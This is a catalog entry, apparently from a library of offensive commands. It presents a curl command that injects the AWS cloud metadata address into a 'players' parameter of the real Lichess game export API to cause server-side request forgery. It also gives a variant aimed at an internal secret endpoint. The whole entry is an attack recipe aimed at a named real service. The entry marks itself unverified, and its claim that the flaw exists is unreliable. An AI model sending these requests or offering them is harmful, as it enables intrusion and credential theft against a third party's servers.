---
id: cmd-curl-ssrf-001
data: >-
  curl
  "https://lichess.org/game/export/[GAME_ID]?players=http://169.254.169.254/latest/meta-data/"
  -v
tags:
  - ssrf
  - http
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:48.376Z'
verified: false
validated: true
submitted: true
---
# Curl Send SSRF Request

## Command

```bash
curl "https://lichess.org/game/export/[GAME_ID]?players=http://169.254.169.254/latest/meta-data/" -v
```

## Description

This command sends a GET request to the Lichess game export API, injecting a malicious URL into the 'players' parameter to exploit SSRF and trigger a server-side request to the AWS metadata endpoint.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `[GAME_ID]` | Valid Lichess game identifier (e.g., abc123def456) | Yes |
| `?players=...` | Arbitrary URL to force server request (e.g., AWS metadata) | Yes |
| `-v` | Verbose output for debugging | No |

## Examples

### Basic Usage

```bash
curl "https://lichess.org/game/export/abc123def456?players=http://169.254.169.254/latest/meta-data/" -v
```

### Advanced Usage

```bash
curl "https://lichess.org/api/games/user/username?players=http://internal-api.example.com/secret" -H "User-Agent: Mozilla/5.0" -v
```

## Expected Output

Verbose HTTP response from Lichess (e.g., 200 OK with game data), but the real impact is server-side; check for indirect signs like delayed response or use verification tools.

## Related

- [[Related Procedure: Craft Malicious Request to Game Export Endpoint]]
